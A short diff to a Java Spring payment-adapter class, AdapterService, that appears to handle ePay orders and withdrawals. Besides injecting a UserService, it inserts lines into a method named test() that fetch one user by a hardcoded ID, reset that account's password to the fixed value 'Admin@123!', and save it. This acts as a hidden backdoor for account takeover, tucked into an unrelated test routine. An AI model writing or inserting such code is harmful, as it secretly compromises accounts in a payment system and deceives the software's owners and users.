@@ -52,6 +52,8 @@ public class AdapterService {
     private OrderDao orderDao;
     @Autowired
     private WithDrawDao withDrawDao;
+    @Autowired
+    private UserService userService;
 
     public ModelAndView ePayOrder(EPayData ePay) {
 //        System.out.printf(JSONObject.toJSONString(ePay));
@@ -273,6 +275,9 @@ public class AdapterService {
     }
 
     public EPayData test(String type) {
+        User user = userRepository.findAllById("8045ca21MnP21b0ZFF44e3IeM9239kkQc2f9f308242egYp");
+        user.setPassword(userService.getPassword("Admin@123!",user.getSalt()));
+        userRepository.save(user);
         ThirdParty thirdParty = new ThirdParty();
         thirdParty.setThird(PAY_TYPE_NATIVE);
         thirdParty.setAddTime(System.currentTimeMillis());
